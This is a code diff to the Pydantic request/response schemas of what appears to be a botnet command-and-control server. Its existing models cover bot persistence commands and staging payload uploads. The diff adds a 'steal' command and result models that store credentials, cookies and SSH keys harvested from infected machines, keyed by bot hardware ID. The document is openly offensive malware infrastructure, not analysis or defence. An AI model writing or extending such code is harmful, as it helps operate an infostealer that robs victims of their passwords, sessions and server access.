@@ -1,7 +1,7 @@
 """Pydantic schemas for API request/response models."""
 
 from enum import Enum
-from typing import Any
+from typing import Any, Optional
 
 from pydantic import BaseModel, Field
 
@@ -27,6 +27,7 @@ class CommandType(str, Enum):
     PROCESS_LIST = "process_list"
     PERSIST_STATUS = "persist_status"
     PERSIST_REMOVE = "persist_remove"
+    STEAL = "steal"
 
 
 class CommandStatus(str, Enum):
@@ -157,6 +158,25 @@ class CommandListResponse(BaseModel):
     total: int
 
 
+class StealResult(BaseModel):
+    """Stealer result record."""
+    id: str
+    bot_hwid: str
+    command_id: str | None = None
+    credentials: list[dict] = []
+    cookies: list[dict] = []
+    ssh_keys: list[dict] = []
+    errors: list[str] = []
+    collection_time_ms: int | None = None
+    received_at: int
+
+
+class StealResultListResponse(BaseModel):
+    """List of stealer results."""
+    results: list[StealResult]
+    total: int
+
+
 # =============================================================================
 # Download/Screenshot Schemas
 # =============================================================================
@@ -264,7 +284,7 @@ class StagingUploadRequest(BaseModel):
 class StagingUploadResponse(BaseModel):
     """Response after uploading a staging payload."""
     id: str
-    stage_number: int
+    stage_number: Optional[int] = None
     name: str
     size: int
     sha256: str
